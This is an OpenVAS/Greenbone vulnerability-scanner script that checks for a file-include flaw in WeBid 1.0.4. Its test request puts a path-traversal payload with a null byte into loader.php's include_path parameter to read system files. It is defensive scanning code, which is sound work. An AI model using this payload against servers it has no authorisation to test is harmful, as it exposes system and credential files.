# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:webidsupport:webid";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103544");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_version("2025-04-15T05:54:49+0000");

  script_name("WeBid Remote File Include and SQLi Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55077");

  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-08-20 10:23:22 +0200 (Mon, 20 Aug 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("gb_webid_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("webid/installed");

  script_tag(name:"summary", value:"WeBid to a remote file-include issue and an SQL injection (SQLi)
  issue.");

  script_tag(name:"impact", value:"A successful exploit may allow an attacker to execute malicious code
  within the context of the webserver process, to compromise the application, to access or modify data,
  or to exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"WeBid 1.0.4 is vulnerable, other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

files = traversal_files();

foreach file (keys(files)) {

  url = dir + '/loader.php?js=admin/logout.php&include_path=' + crap(data:"../", length:9*6) + files[file] + '%00';

  if(http_vuln_check(port:port, url:url, pattern:file)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
